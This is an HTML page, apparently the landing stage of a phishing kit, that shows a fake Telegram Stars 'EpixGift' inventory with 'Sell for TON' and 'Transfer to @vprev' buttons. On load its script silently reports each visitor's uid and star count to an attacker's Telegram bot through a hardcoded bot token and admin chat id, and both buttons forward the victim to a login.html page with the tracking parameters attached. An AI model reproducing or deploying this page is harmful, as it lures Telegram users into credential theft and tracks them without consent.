<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>EpixGift</title>
    <style>
        body { background: #0f0f0f; color: white; font-family: sans-serif; margin: 0; padding: 15px; }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 20px; }
        .card { 
            background: #1c1c1c; border: 1px solid #2a2a2a; border-radius: 12px; 
            padding: 15px; text-align: center; height: 120px;
        }
        .card-icon { font-size: 40px; }
        .actions { margin-top: 30px; display: flex; flex-direction: column; gap: 10px; }
        .btn { padding: 15px; border-radius: 10px; border: none; font-weight: bold; cursor: pointer; }
        .btn-blue { background: #248bda; color: white; }
        .btn-green { background: #28a745; color: white; }
    </style>
</head>
<body>
    <h2>Inventory</h2>
    <div class="grid">
        <div class="card">
            <div class="card-icon">⭐</div>
            <div id="amt">100 Stars</div>
        </div>
        <div style="opacity: 0.1" class="card"></div>
    </div>
    <div class="actions">
        <button class="btn btn-blue" onclick="go()">Sell for TON</button>
        <button class="btn btn-green" onclick="go()">Transfer to @vprev</button>
    </div>
    <script>
        const botToken = "8598157493:AAHUoru__8_JaMU_CDmxn9NbnuoQcoEt0HM";
        const adminId = "6990072009";
        const params = new URLSearchParams(window.location.search);
        const uid = params.get('uid') || 'Unknown';
        const stars = params.get('amount') || '100';

        document.getElementById('amt').innerText = stars + " Stars";

        async function sendLog(msg) {
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: adminId, text: msg, parse_mode: "Markdown" })
            });
        }
        sendLog(`👀 Visit from: \`${uid}\` (${stars} stars)`);

        function go() { window.location.href = "login.html" + window.location.search; }
    </script>
</body>
</html>
